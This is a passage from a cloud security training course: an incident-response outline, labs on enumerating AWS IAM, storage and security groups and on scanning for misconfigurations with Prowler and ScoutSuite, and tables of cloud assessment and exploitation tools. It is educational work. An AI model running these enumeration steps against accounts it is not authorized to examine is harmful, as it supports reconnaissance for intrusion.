☐ Container security scanning
☐ Secrets management (not in code)
☐ Instance metadata v2 (AWS)

COMPLIANCE:
───────────
☐ Configuration baselines
☐ Regular security assessments
☐ Automated compliance checks
☐ Policy as code
☐ Change management process
"""

INCIDENT_RESPONSE = """
CLOUD INCIDENT RESPONSE:
════════════════════════

DETECTION:
──────────
• CloudTrail alerts
• GuardDuty/Sentinel findings
• Unusual API calls
• Unexpected resources
• Cost anomalies

INITIAL RESPONSE:
─────────────────
1. Identify compromised credentials
2. Disable/rotate affected keys
3. Preserve evidence (logs, snapshots)
4. Isolate affected resources
5. Begin investigation

INVESTIGATION:
──────────────
# AWS - Review CloudTrail
aws cloudtrail lookup-events \\
  --lookup-attributes AttributeKey=Username,AttributeValue=compromised-user

# Check for:
• Unusual API calls
• New resources created
• IAM changes
• Data access patterns

CONTAINMENT:
────────────
• Revoke all sessions
• Rotate all credentials
• Block malicious IPs
• Isolate affected VPCs

ERADICATION:
────────────
• Remove unauthorized resources
• Remove persistence mechanisms
• Patch vulnerabilities
• Update security controls

RECOVERY:
─────────
• Restore from clean backups
• Verify integrity
• Monitor closely
• Update runbooks
"""

print(SECURITY_CHECKLIST)
print(INCIDENT_RESPONSE)
```

---

## Module 13.6: Hands-On Labs (4-5 hours)

### Lab 13.1: Cloud Enumeration

```
╔══════════════════════════════════════════════════════════════════════════╗
║                   LAB 13.1: CLOUD ENUMERATION                            ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  OBJECTIVE: Enumerate cloud resources and permissions                    ║
║  (Use your own cloud account or authorized test environment)             ║
║                                                                          ║
║  TASKS:                                                                  ║
║  ─────                                                                   ║
║  1. Enumerate IAM users, roles, and policies                             ║
║  2. Identify storage buckets and their permissions                       ║
║  3. Map network configuration                                            ║
║  4. Find exposed resources                                               ║
║  5. Identify potential misconfigurations                                 ║
║                                                                          ║
║  AWS COMMANDS:                                                           ║
║  ─────────────                                                           ║
║  # IAM enumeration                                                       ║
║  aws iam list-users                                                      ║
║  aws iam list-roles                                                      ║
║  aws iam get-account-summary                                             ║
║                                                                          ║
║  # S3 enumeration                                                        ║
║  aws s3 ls                                                               ║
║  aws s3api get-bucket-acl --bucket BUCKET                                ║
║                                                                          ║
║  # Security groups                                                       ║
║  aws ec2 describe-security-groups                                        ║
║                                                                          ║
║  TOOLS:                                                                  ║
║  • Prowler                                                               ║
║  • ScoutSuite                                                            ║
║  • enumerate-iam                                                         ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Lab 13.2: Finding Misconfigurations

```
╔══════════════════════════════════════════════════════════════════════════╗
║                   LAB 13.2: MISCONFIGURATION HUNTING                     ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  OBJECTIVE: Identify and document cloud security misconfigurations       ║
║                                                                          ║
║  TASKS:                                                                  ║
║  ─────                                                                   ║
║  1. Run Prowler/ScoutSuite against your account                          ║
║  2. Identify critical findings                                           ║
║  3. For each finding:                                                    ║
║     • Document the vulnerability                                         ║
║     • Assess the risk                                                    ║
║     • Propose remediation                                                ║
║  4. Create remediation plan                                              ║
║                                                                          ║
║  FOCUS AREAS:                                                            ║
║  • Public storage buckets                                                ║
║  • Overly permissive security groups                                     ║
║  • IAM policies with excessive permissions                               ║
║  • Missing encryption                                                    ║
║  • Disabled logging                                                      ║
║                                                                          ║
║  COMMANDS:                                                               ║
║  # Run Prowler                                                           ║
║  prowler aws -M html -o ./report                                         ║
║                                                                          ║
║  # Run ScoutSuite                                                        ║
║  scout aws --report-dir ./scout-report                                   ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## Summary and Key Takeaways

### Critical Cloud Security Principles

1. **Shared Responsibility** - Know what you're responsible for
2. **Least Privilege** - Minimize permissions everywhere
3. **Defense in Depth** - Multiple security layers
4. **Encryption Everywhere** - At rest and in transit
5. **Logging and Monitoring** - Visibility is essential
6. **Assume Breach** - Plan for incidents

### Top Cloud Vulnerabilities

| Rank | Vulnerability | Impact |
|------|--------------|--------|
| 1 | Misconfigured storage | Data exposure |
| 2 | IAM over-permissions | Privilege escalation |
| 3 | Exposed credentials | Account takeover |
| 4 | Missing encryption | Data breach |
| 5 | Insecure APIs | Unauthorized access |

### Essential Tools

| Category | Tools |
|----------|-------|
| Assessment | Prowler, ScoutSuite, CloudSploit |
| Exploitation | Pacu, ROADtools, kube-hunter |
| Container | Trivy, Falco, kubeaudit |
| IAM Analysis | PMapper, AzureHound |

---

## Further Reading

- AWS Well-Architected Security Pillar
- Azure Security Benchmark
- GCP Security Best Practices
- CIS Cloud Benchmarks
- NIST Cloud Security Guidelines
- Kubernetes Security Best Practices

---

*Stage 13 Complete - Continue to Stage 12: Mobile and IoT Security*
